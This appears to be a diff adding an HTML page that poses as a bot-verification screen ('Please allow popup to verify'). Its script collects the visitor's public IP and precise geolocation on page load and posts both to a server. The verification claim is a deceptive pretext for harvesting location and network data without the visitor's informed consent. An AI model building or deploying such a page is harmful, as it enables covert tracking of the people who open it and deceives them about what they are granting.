@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<head>
+    <title>Heo</title>
+
+
+    <script>
+
+        window.onload = function checkip() {
+            getlocation();
+            fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                fetch("http://127.0.0.1:5000/check-bot", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        ip: data.ip
+                    }),
+                    headers: {
+                        "Content-Type" : "Application/Json"
+                    }
+                })
+            })
+        }
+
+        function getlocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                console.log("FUCK")
+            }
+        }
+        function showPosition(position) {
+            fetch("http://127.0.0.1:5000/coords", {
+                method: "POST",
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    long: position.coords.longitude
+                }),
+                headers: {
+                    "Content-Type" : "Application/Json"
+                }
+            })
+
+        }
+
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap');
+        html {
+            font-family: "Open Sans", sans-serif;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+
+    </style>
+
+
+
+</head>
+
+<body>
+
+    <h1>Please allow popup to verify</h1>
+</body>
+
+
